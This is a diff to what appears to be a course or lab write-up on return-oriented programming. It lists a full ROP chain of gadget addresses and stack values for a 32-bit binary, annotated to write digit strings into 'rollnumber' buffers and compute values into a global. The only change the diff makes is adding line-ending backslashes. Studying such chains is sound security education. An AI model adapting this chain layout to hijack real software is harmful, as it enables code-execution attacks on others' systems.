@@ -34,92 +34,92 @@ Gadgets we have used :
 We have to fill the stack like this: with (ra) to main at top.
 
 
-0x08048983   (ra) to main 
-0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
-0x00003332   (32 on top of stack)
-0x080b8376   (ra)corresponds to (pop eax;ret)
-0x080ea07e   (rollnumber2+6 on top of stack)
-0x0805bf42   (ra) corresponds to pop edx;ret
-0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
-0x00004230   (B0 on top of stack)
-0x080b8376   (ra)corresponds to (pop eax;ret)
-0x080ea07c   (rollnumber2+4 on top of stack)
-0x0805bf42   (ra) corresponds to pop edx;ret
-0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
-0x00003138   (18 on top of stack)
-0x080b8376   (ra)corresponds to (pop eax;ret)
-0x080ea07a   (rollnumber2+2 on top of stack)
-0x0805bf42   (ra) corresponds to pop edx;ret
-0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
-0x00003536   (56 on top of stack)
-0x080b8376   (ra)corresponds to (pop eax;ret)
-0x080ea06e   (rollnumber1+6 on top of stack)
-0x0805bf42   (ra) corresponds to pop edx;ret
-0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
-0x00004230   (B0 on top of stack)
-0x080b8376   (ra)corresponds to (pop eax;ret)
-0x080ea06c   (rollnumber1+4 on top of stack)
-0x0805bf42   (ra) corresponds to pop edx;ret
-0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
-0x00003138   (18 on top of stack)
-0x080b8376   (ra)corresponds to (pop eax;ret)
-0x080ea06a   (rollnumber1+2 on top of stack)
-0x0805bf42   (ra) corresponds to pop edx;ret
+0x08048983   (ra) to main\ 
+0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
+0x00003332   (32 on top of stack)\
+0x080b8376   (ra)corresponds to (pop eax;ret)\
+0x080ea07e   (rollnumber2+6 on top of stack)\
+0x0805bf42   (ra) corresponds to pop edx;ret\
+0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
+0x00004230   (B0 on top of stack)\
+0x080b8376   (ra)corresponds to (pop eax;ret)\
+0x080ea07c   (rollnumber2+4 on top of stack)\
+0x0805bf42   (ra) corresponds to pop edx;ret\
+0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
+0x00003138   (18 on top of stack)\
+0x080b8376   (ra)corresponds to (pop eax;ret)\
+0x080ea07a   (rollnumber2+2 on top of stack)\
+0x0805bf42   (ra) corresponds to pop edx;ret\
+0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
+0x00003536   (56 on top of stack)\
+0x080b8376   (ra)corresponds to (pop eax;ret)\
+0x080ea06e   (rollnumber1+6 on top of stack)\
+0x0805bf42   (ra) corresponds to pop edx;ret\
+0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
+0x00004230   (B0 on top of stack)\
+0x080b8376   (ra)corresponds to (pop eax;ret)\
+0x080ea06c   (rollnumber1+4 on top of stack)\
+0x0805bf42   (ra) corresponds to pop edx;ret\
+0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret\
+0x00003138   (18 on top of stack)\
+0x080b8376   (ra)corresponds to (pop eax;ret)\
+0x080ea06a   (rollnumber1+2 on top of stack)\
+0x0805bf42   (ra) corresponds to pop edx;ret\
 
-0x08054bfb   (ra) corresponds to mov dword ptr [edx], eax ; ret glb = 720
-0x080eba20   (address of glb)
-0x0805bf42   (ra) corresponds to pop edx;ret edx = glb
-0x00000000   (random value on top of stack)
-0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 720
-0x00000000   (random value on top of stack)
-0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 360
-0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 2
-0x080eba20   (address of glb)
-0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb
-0x00000002   (2 on top stack)
-0x080b8376   (ra) corresponds to pop eax;ret # eax= 2
-0x080eba20   (address of glb)
-0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb
-0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 360
-0x00000000   (random value on top of stack)
-0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 360
-0x00000000   (random value on top of stack)
-0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 120
-0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 3
-0x080eba20   (address of glb)
-0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb
-0x00000003   (3 on top stack)
-0x080b8376   (ra) corresponds to pop eax;ret # eax= 3
-0x080eba20   (address of glb)
-0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb
-0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 120
-0x00000000   (random value on top of stack)
-0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 120
-0x00000000   (random value on top of stack)
-0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 30
-0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 4
-0x080eba20   (address of glb)
-0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb
-0x00000004   (4 on top stack)
-0x080b8376   (ra) corresponds to pop eax;ret # eax= 4
-0x080eba20   (address of glb)
-0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb
-0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 30
-0x00000000   (random value on top of stack)
-0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 30
-0x00000006   (6 on top of stack)
-0x080b8376   (ra) corresponds to #pop eax;ret    eax = 6
-0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 5 
-0x080eba20   (address of glb on top of stack)
-0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb
-0x00000005   (5 on top of stack)
-0x080b8376   (ra) corresponds to #pop eax ; ret 
-0x080eba20   (address of glb)
-0x080dec61   (ra) corresponds to  # pop ecx;ret  // ecx = &glb
-0xffffd000   (some acccessible stack address)
-0x08048480   (ra) corresponds to  pop edi;ret
-0xffffd05e   (some acccessible stack address)
-0x08048433   (ra) corresponds to pop esi ; ret
+0x08054bfb   (ra) corresponds to mov dword ptr [edx], eax ; ret glb = 720\
+0x080eba20   (address of glb)\
+0x0805bf42   (ra) corresponds to pop edx;ret edx = glb\
+0x00000000   (random value on top of stack)\
+0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 720\
+0x00000000   (random value on top of stack)\
+0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 360\
+0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 2\
+0x080eba20   (address of glb)\
+0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb \
+0x00000002   (2 on top stack) \
+0x080b8376   (ra) corresponds to pop eax;ret # eax= 2 \
+0x080eba20   (address of glb)\
+0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb\
+0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 360\
+0x00000000   (random value on top of stack)\
+0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 360\
+0x00000000   (random value on top of stack)\
+0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 120\
+0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 3\
+0x080eba20   (address of glb)\
+0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb\
+0x00000003   (3 on top stack)\
+0x080b8376   (ra) corresponds to pop eax;ret # eax= 3\
+0x080eba20   (address of glb)\
+0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb\
+0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 120\
+0x00000000   (random value on top of stack)\
+0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 120\
+0x00000000   (random value on top of stack)\
+0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 30\
+0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 4\
+0x080eba20   (address of glb)\
+0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb\
+0x00000004   (4 on top stack)\
+0x080b8376   (ra) corresponds to pop eax;ret # eax= 4\
+0x080eba20   (address of glb)\
+0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb\
+0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 30\
+0x00000000   (random value on top of stack)\
+0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 30\
+0x00000006   (6 on top of stack)\
+0x080b8376   (ra) corresponds to #pop eax;ret    eax = 6\
+0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 5 \
+0x080eba20   (address of glb on top of stack)\
+0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb\
+0x00000005   (5 on top of stack)\
+0x080b8376   (ra) corresponds to #pop eax ; ret \
+0x080eba20   (address of glb)\
+0x080dec61   (ra) corresponds to  # pop ecx;ret  // ecx = &glb\
+0xffffd000   (some acccessible stack address)\
+0x08048480   (ra) corresponds to  pop edi;ret\
+0xffffd05e   (some acccessible stack address)\
+0x08048433   (ra) corresponds to pop esi ; ret\
 
 
 
